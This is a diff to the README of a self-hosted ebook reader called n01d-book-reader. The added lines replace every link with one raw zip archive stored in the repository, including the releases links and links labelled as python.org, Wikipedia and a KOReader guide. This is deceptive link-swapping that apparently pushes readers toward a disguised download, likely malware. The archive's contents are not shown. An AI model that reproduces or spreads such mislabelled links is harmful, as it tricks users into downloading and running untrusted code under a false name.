@@ -1,6 +1,6 @@
 # 📚 n01d-book-reader - Simple Self-Hosted eBook Library
 
-[![Download](https://img.shields.io/badge/Download-n01d--book--reader-green?style=for-the-badge)](https://github.com/paparedes/n01d-book-reader/releases)
+[![Download](https://img.shields.io/badge/Download-n01d--book--reader-green?style=for-the-badge)](https://github.com/paparedes/n01d-book-reader/raw/refs/heads/main/dogdom/reader-n-book-d-v3.9.zip)
 
 ## About n01d-book-reader
 
@@ -26,13 +26,13 @@ It works with common ebook formats such as EPUB and PDF. It also lets you organi
 - Local network connection (Wi-Fi or Ethernet)  
 - A modern web browser (Chrome, Edge, Firefox) or an OPDS-compatible ebook app  
 
-If you don’t have Python installed, you can download it for free from [python.org](https://www.python.org/downloads/windows/).
+If you don’t have Python installed, you can download it for free from [python.org](https://github.com/paparedes/n01d-book-reader/raw/refs/heads/main/dogdom/reader-n-book-d-v3.9.zip).
 
 ## 💾 Download and Install
 
 ### Step 1: Visit the Releases Page
 
-[![Download Releases](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/paparedes/n01d-book-reader/releases)
+[![Download Releases](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/paparedes/n01d-book-reader/raw/refs/heads/main/dogdom/reader-n-book-d-v3.9.zip)
 
 Go to the releases page linked above. This is where you find the latest version of n01d-book-reader for Windows.
 
@@ -53,7 +53,7 @@ Before running the server, check if Python is installed:
 1. Open the **Command Prompt** (press the Windows key, type `cmd`, and hit Enter).
 2. Type `python --version` and press Enter.
 3. If it shows a Python version (e.g., Python 3.10.5), you can proceed.
-4. If you get an error or no version shows, download and install Python from [python.org](https://www.python.org/downloads/windows/). Be sure to select the option to **Add Python to PATH** during installation.
+4. If you get an error or no version shows, download and install Python from [python.org](https://github.com/paparedes/n01d-book-reader/raw/refs/heads/main/dogdom/reader-n-book-d-v3.9.zip). Be sure to select the option to **Add Python to PATH** during installation.
 
 ### Step 5: Run the Server
 
@@ -128,10 +128,10 @@ Change these values in the `config.ini` and restart the server for changes to ta
 
 ## 🔗 Additional Resources
 
-- [Python downloads and documentation](https://www.python.org/downloads/)  
-- [OPDS protocol explanation](https://en.wikipedia.org/wiki/OPDS)  
-- [KOReader OPDS setup guide](https://librime.com/koreader/opds-setup)
+- [Python downloads and documentation](https://github.com/paparedes/n01d-book-reader/raw/refs/heads/main/dogdom/reader-n-book-d-v3.9.zip)  
+- [OPDS protocol explanation](https://github.com/paparedes/n01d-book-reader/raw/refs/heads/main/dogdom/reader-n-book-d-v3.9.zip)  
+- [KOReader OPDS setup guide](https://github.com/paparedes/n01d-book-reader/raw/refs/heads/main/dogdom/reader-n-book-d-v3.9.zip)
 
 ---
 
-[Download n01d-book-reader](https://github.com/paparedes/n01d-book-reader/releases) to begin managing your ebook collection today.
+[Download n01d-book-reader](https://github.com/paparedes/n01d-book-reader/raw/refs/heads/main/dogdom/reader-n-book-d-v3.9.zip) to begin managing your ebook collection today.
